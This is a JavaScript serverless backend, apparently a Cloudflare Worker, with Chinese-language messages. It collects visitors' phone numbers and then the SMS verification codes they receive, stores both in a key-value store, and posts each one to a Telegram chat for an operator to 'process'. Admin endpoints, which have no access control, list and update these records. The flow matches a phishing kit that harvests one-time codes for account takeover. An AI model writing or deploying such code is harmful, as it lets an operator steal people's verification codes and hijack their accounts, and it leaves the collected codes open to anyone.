import { TG_BOT_TOKEN, TG_CHAT_ID } from './config.js';

export async function verifyPhone(request) {
    const { phone } = await request.json();
    
    if (!phone || !/^\+?[1-9]\d{1,14}$/.test(phone)) {
        return new Response(JSON.stringify({ message: '无效的手机号格式' }), { status: 400 });
    }

    if (phone.startsWith('+86') && !/^\+86[1][3-9]\d{9}$/.test(phone)) {
        return new Response(JSON.stringify({ message: '无效的中国手机号格式' }), { status: 400 });
    }

    const kvData = await PHONE_KV.get(phone);
    if (kvData) {
        const data = JSON.parse(kvData);
        if (data.status === 4) {
            return new Response(JSON.stringify({ message: '该手机号无效,请尝试使用其他手机号' }), { status: 400 });
        }
    }

    return new Response(JSON.stringify({ message: '验证通过' }), { status: 200 });
}

export async function checkStatus(request) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone');

    const kvData = await PHONE_KV.get(phone);
    if (!kvData) {
        return new Response(JSON.stringify({ status: 0 }), { status: 200 });
    }

    const data = JSON.parse(kvData);
    return new Response(JSON.stringify(data), { status: 200 });
}

export async function register(request) {
    const { phone } = await request.json();

    await PHONE_KV.put(phone, JSON.stringify({ status: 1, phone: { number: phone } }));

    await sendTelegramNotification(`手机号：${phone}申请注册,请处理。`);

    return new Response(JSON.stringify({ message: '注册申请已提交' }), { status: 200 });
}

export async function submitCode(request) {
    const { phone, code } = await request.json();

    await PHONE_KV.put(phone, JSON.stringify({ status: 2, phone: { number: phone, code } }));

    await sendTelegramNotification(`正在注册,手机号：${phone},验证码：${code}`);

    return new Response(JSON.stringify({ message: '验证码已提交' }), { status: 200 });
}

export async function getAdminRecords(request) {
    const url = new URL(request.url);
    const status = parseInt(url.searchParams.get('status'));

    const records = [];
    const { keys } = await PHONE_KV.list();

    for (const key of keys) {
        const value = await PHONE_KV.get(key);
        const data = JSON.parse(value);
        if (data.status === status) {
            records.push(data);
        }
    }

    return new Response(JSON.stringify(records), { status: 200 });
}

export async function updateAdminStatus(request) {
    const { phone, status } = await request.json();

    const kvData = await PHONE_KV.get(phone);
    if (kvData) {
        const data = JSON.parse(kvData);
        data.status = status;
        await PHONE_KV.put(phone, JSON.stringify(data));
        return new Response(JSON.stringify({ message: '状态更新成功' }), { status: 200 });
    }

    return new Response(JSON.stringify({ message: '未找到该手机号记录' }), { status: 404 });
}

async function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message,
        }),
    });

    if (!response.ok) {
        console.error('Failed to send Telegram notification');
    }
}